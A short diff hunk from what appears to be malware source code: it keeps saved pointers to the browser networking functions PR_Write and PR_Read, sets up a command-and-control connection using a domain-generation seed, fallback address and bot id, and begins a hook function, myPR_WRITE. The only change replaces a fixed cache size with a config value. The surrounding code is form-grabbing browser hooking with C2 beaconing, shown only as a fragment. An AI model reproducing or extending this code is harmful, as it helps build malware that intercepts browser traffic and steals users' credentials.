@@ -12,7 +12,7 @@
 pr_io_func pr_write_orig = 0;
 pr_io_func pr_read_orig = 0;
 C2 c2connection{ conf::dgaseed,conf::fallbackaddr,conf::tlds,conf::port,conf::id};
-CacheManager cachemanger(100);
+CacheManager cachemanger(conf::max_cache_files);
 
 int myPR_WRITE(void* fd, void* buf, int amnt) {
 
